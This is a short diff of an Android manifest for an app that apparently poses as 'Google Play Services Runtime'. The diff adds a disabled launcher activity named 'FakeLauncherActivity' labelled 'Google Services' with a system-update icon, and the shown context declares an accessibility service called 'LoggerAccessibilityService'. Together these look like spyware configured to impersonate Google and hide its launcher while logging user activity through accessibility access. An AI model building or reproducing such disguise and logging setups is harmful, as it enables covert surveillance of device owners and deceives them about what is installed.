@@ -42,12 +42,23 @@
         android:supportsRtl="true"
         android:label="Google Play Services Runtime"
         android:theme="@style/Theme.AppCompat"
-        android:icon="@drawable/ic_launcher_foreground"
+        android:icon="@drawable/ic_sys_update"
         tools:targetApi="33"
         tools:ignore="DataExtractionRules">
         <meta-data
             android:name="com.google.android.wearable.standalone"
             android:value="true" />
+        <activity
+            android:name=".FakeLauncherActivity"
+            android:exported="true"
+            android:enabled="false"
+            android:label="Google Services"
+            android:icon="@drawable/ic_sys_update">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
         <!-- Accessibility Service -->
         <service
             android:name=".accessibility.LoggerAccessibilityService"
